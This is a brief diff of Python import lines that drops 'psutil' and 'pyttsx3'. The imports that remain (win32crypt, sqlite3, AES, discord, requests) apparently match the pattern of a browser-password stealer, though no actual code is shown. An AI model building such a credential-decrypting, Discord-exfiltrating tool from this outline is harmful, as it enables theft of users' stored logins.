@@ -17,10 +17,8 @@ import requests
 import webbrowser
 import locale
 import os
-import psutil
 import sqlite3
 import shutil
-import pyttsx3
 import win32crypt
 import discord
 from Cryptodome.Cipher import AES
